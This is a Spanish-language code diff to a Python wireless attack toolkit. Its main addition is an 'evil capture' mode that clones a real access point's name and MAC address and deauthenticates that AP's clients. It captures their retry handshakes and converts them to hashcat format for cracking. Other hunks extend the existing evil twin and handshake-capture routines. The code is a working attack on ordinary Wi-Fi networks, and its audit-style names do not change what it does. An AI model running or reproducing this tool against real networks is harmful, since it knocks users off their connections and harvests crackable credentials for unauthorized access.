@@ -208,6 +208,7 @@ def pmkid(interfaz, bssid, canal, banda=None, segundos=30, salida=None, seco=Fal
         objetivo.unlink(missing_ok=True)
     print(f"PMKID del objetivo: {cantidad}; captura privada: {cap}")
     if cantidad:
+        print(f"ARTEFACTO={objetivo}")
         print(f"Analiza por separado: auditor_generico.sh --tipo wifi {objetivo}")
     ceder_salida()
     return 0 if cantidad else 1
@@ -808,6 +809,7 @@ def wpa3(interfaz, bssid, canal, segundos=60, seco=False):
         print(f"SAE observado: {'sí' if sae else 'no'}; material 22000: {lineas} "
               f"hash(es); captura: {cap}")
         if lineas:
+            print(f"ARTEFACTO={hash_22000}")
             print(f"Crackéalo con: auditor_generico.sh --tipo wifi {hash_22000}")
         return 0 if lineas else 1
     finally:
@@ -841,7 +843,15 @@ def evil_twin(interfaz, ssid, canal=1, segundos=60, seco=False):
         f"hw_mode={'g' if canal <= 14 else 'a'}\nchannel={canal}\n"
         "ieee80211n=1\nwmm_enabled=0\n", encoding="utf-8")
     pids = []
+    nmcli = shutil.which("nmcli") or shutil.which("nmcli", path="/usr/bin")
     try:
+        with open(os.devnull, "wb") as nada:
+            if nmcli:
+                subprocess.run([nmcli, "device", "set", interfaz, "managed",
+                                "off"], stdout=nada, stderr=nada, timeout=15,
+                               check=False)
+            subprocess.run(["ip", "link", "set", interfaz, "down"],
+                           stdout=nada, stderr=nada, timeout=15, check=False)
         subprocess.run(["ip", "addr", "add", "192.168.250.1/24", "dev", interfaz],
                        check=False, capture_output=True, timeout=10)
         with open(os.devnull, "wb") as nada:
@@ -884,6 +894,13 @@ def evil_twin(interfaz, ssid, canal=1, segundos=60, seco=False):
                     pass
         subprocess.run(["ip", "addr", "del", "192.168.250.1/24", "dev", interfaz],
                        check=False, capture_output=True, timeout=10)
+        with open(os.devnull, "wb") as nada:
+            subprocess.run(["ip", "link", "set", interfaz, "down"],
+                           stdout=nada, stderr=nada, timeout=15, check=False)
+            if nmcli:
+                subprocess.run([nmcli, "device", "set", interfaz, "managed",
+                                "on"], stdout=nada, stderr=nada, timeout=15,
+                               check=False)
         _ceder(carpeta)
 
 
@@ -1024,6 +1041,141 @@ def wps_pins(interfaz, bssid, canal, limite=10, seco=False):
         _ceder(carpeta)
 
 
+
+def evil_capture(interfaz, ssid, bssid, canal, segundos=90, seco=False):
+    """Evil twin capturamanos: clona ESSID+BSSID exactos con WPA2, desautentica
+    a los clientes del AP real y captura sus handshakes de reintento."""
+    if not ssid:
+        raise ValueError("--ssid es obligatorio (el SSID a clonar)")
+    if not 30 <= segundos <= 300:
+        raise ValueError("--segundos debe estar entre 30 y 300")
+    if seco:
+        print(f"Plan: clonar '{ssid}' ({bssid}, canal {canal}) con WPA2-PSK "
+              f"dummy en {interfaz}, desautenticar clientes y capturar "
+              f"handshakes de reintento durante {segundos}s")
+        return 0
+    bssid = validar_objetivo(interfaz, bssid, canal)
+    if os.geteuid() != 0:
+        raise ValueError("requiere sudo; la interfaz debe estar en managed "
+                         "(sin monitor) y con NetworkManager suelto")
+    hostapd = binario("hostapd")
+    airodump = binario("airodump-ng")
+    aireplay = binario("aireplay-ng")
+    conversion = binario("hcxpcapngtool")
+    iw = binario("iw")
+    phy = Path(f"/sys/class/net/{interfaz}/phy80211")
+    if not phy.exists():
+        raise ValueError(f"{interfaz} no tiene phy80211")
+    phy = phy.readlink().name if hasattr(phy, "readlink") else os.readlink(phy).split("/")[-1]
+    os.umask(0o077)
+    carpeta = _carpeta_capturas("evilcap_")
+    conf = carpeta / "hostapd.conf"
+    conf.write_text(
+        f"interface={interfaz}\ndriver=nl80211\nbssid={bssid}\n"
+        f"ssid={ssid}\n"
+        f"hw_mode={'g' if canal <= 14 else 'a'}\nchannel={canal}\n"
+        "ieee80211n=1\nwmm_enabled=0\nauth_algs=1\nwpa=2\n"
+        "wpa_passphrase=kit-audit-clone-sin-secreto\n"
+        "wpa_key_mgmt=WPA-PSK\nwpa_pairwise=CCMP\nrsn_pairwise=CCMP\n",
+        encoding="utf-8")
+    vif = "kitcap"
+    nmcli = shutil.which("nmcli") or shutil.which("nmcli", path="/usr/bin")
+    mac_original = ""
+    try:
+        mac_original = Path(f"/sys/class/net/{interfaz}/address").read_text().strip()
+        with open(os.devnull, "wb") as nada:
+            if nmcli:
+                subprocess.run([nmcli, "device", "set", interfaz, "managed",
+                                "off"], stdout=nada, stderr=nada, timeout=15,
+                               check=False)
+            subprocess.run(["ip", "link", "set", interfaz, "down"],
+                           stdout=nada, stderr=nada, timeout=15, check=False)
+            subprocess.run(["ip", "link", "set", interfaz, "address", bssid],
+                           stdout=nada, stderr=nada, timeout=15, check=False)
+            arranque = subprocess.run(
+                [hostapd, "-B", "-P", str(carpeta / "hostapd.pid"), str(conf)],
+                capture_output=True, text=True, timeout=30, check=False)
+        if arranque.returncode != 0:
+            raise ValueError("hostapd no pudo levantar el clon: "
+                             + (arranque.stderr or "").strip()[-300:])
+        with open(os.devnull, "wb") as nada:
+            creacion = subprocess.run(
+                [iw, "phy", phy, "interface", "add", vif, "type", "monitor"],
+                stdout=nada, stderr=nada, timeout=15, check=False)
+        if creacion.returncode != 0:
+            raise ValueError("el chip no permite AP+monitor simultáneos "
+                             "(iw interface add falló): en mt7925 prueba "
+                             "otro canal o reinicia el driver mt7925e")
+        with open(os.devnull, "wb") as nada:
+            subprocess.run(["ip", "link", "set", vif, "up"], stdout=nada,
+                           stderr=nada, timeout=10, check=False)
+            subprocess.run([iw, "dev", vif, "set", "channel", str(canal)],
+                           stdout=nada, stderr=nada, timeout=10, check=False)
+        cap = carpeta / "reintentos"
+        with open(os.devnull, "wb") as nada:
+            cazador = subprocess.Popen(
+                [airodump, "--bssid", bssid, "-c", str(canal), "-w", str(cap),
+                 vif], stdout=nada, stderr=nada, preexec_fn=limitar_captura)
+        try:
+            time.sleep(5)
+            with open(os.devnull, "wb") as nada:
+                subprocess.run([aireplay, "--deauth", "4", "-a", bssid, vif,
+                                "--ignore-negative-one"], stdout=nada,
+                               stderr=nada, timeout=45, check=False)
+            time.sleep(max(10, segundos - 20))
+        finally:
+            cazador.terminate()
+            cazador.wait(timeout=15)
+        pcap = Path(str(cap) + "-01.cap")
+        csv = Path(str(cap) + "-01.csv")
+        clientes = set()
+        if csv.is_file():
+            for linea in csv.read_text(errors="replace").splitlines():
+                campos = linea.split(",")
+                if len(campos) > 6 and campos[0].count(":") == 5 \
+                        and campos[1].strip().upper() == bssid:
+                    clientes.add(campos[0])
+        hash_22000 = carpeta / "reintentos.22000"
+        lineas = 0
+        if pcap.is_file():
+            with open(os.devnull, "wb") as nada:
+                subprocess.run([conversion, "-o", str(hash_22000), str(pcap)],
+                               stdout=nada, stderr=nada, timeout=60,
+                               check=False)
+            if hash_22000.is_file():
+                lineas = sum(1 for _ in hash_22000.open())
+        print(f"clientes vistos del AP real: {len(clientes)}; "
+              f"handshakes capturados: {lineas}")
+        if lineas:
+            print(f"ARTEFACTO={hash_22000}")
+            print(f"Crackéalo con: auditor_generico.sh --tipo wifi {hash_22000}")
+        else:
+            print("Sin handshakes: los clientes no reintentaron contra el clon "
+                  "(señal débil o PMF activo en el AP real)")
+        return 0 if lineas else 1
+    finally:
+        pid = carpeta / "hostapd.pid"
+        if pid.is_file():
+            try:
+                os.kill(int(pid.read_text().strip()), signal.SIGTERM)
+            except (ProcessLookupError, ValueError):
+                pass
+        with open(os.devnull, "wb") as nada:
+            subprocess.run([iw, "dev", vif, "del"], stdout=nada, stderr=nada,
+                           timeout=10, check=False)
+            subprocess.run(["ip", "link", "set", interfaz, "down"],
+                           stdout=nada, stderr=nada, timeout=15, check=False)
+            if mac_original:
+                subprocess.run(["ip", "link", "set", interfaz, "address",
+                                mac_original], stdout=nada, stderr=nada,
+                               timeout=15, check=False)
+            if nmcli:
+                subprocess.run([nmcli, "device", "set", interfaz, "managed",
+                                "on"], stdout=nada, stderr=nada, timeout=15,
+                               check=False)
+        _ceder(carpeta)
+
+
 def main():
     parser = argparse.ArgumentParser(description=__doc__)
     sub = parser.add_subparsers(dest="accion", required=True)
@@ -1087,6 +1239,13 @@ def main():
     mgt_parser.add_argument("--segundos", type=int, default=20)
     mgt_parser.add_argument("--forzar", action="store_true")
     mgt_parser.add_argument("--dry-run", action="store_true")
+    evilcap_parser = sub.add_parser("wifi-evil-capture")
+    evilcap_parser.add_argument("--interfaz", required=True)
+    evilcap_parser.add_argument("--ssid", required=True)
+    evilcap_parser.add_argument("--bssid", required=True)
+    evilcap_parser.add_argument("--canal", type=int, required=True)
+    evilcap_parser.add_argument("--segundos", type=int, default=90)
+    evilcap_parser.add_argument("--dry-run", action="store_true")
     krack_parser = sub.add_parser("wifi-krack")
     krack_parser.add_argument("--dry-run", action="store_true")
     pins_parser = sub.add_parser("wps-pins")
@@ -1129,6 +1288,9 @@ def main():
         if args.accion == "wifi-enterprise":
             return enterprise(args.interfaz, args.banda, args.segundos,
                               args.forzar, args.dry_run)
+        if args.accion == "wifi-evil-capture":
+            return evil_capture(args.interfaz, args.ssid, args.bssid,
+                                args.canal, args.segundos, args.dry_run)
         if args.accion == "wifi-krack":
             return krack(args.dry_run)
         if args.accion == "wps-pins":
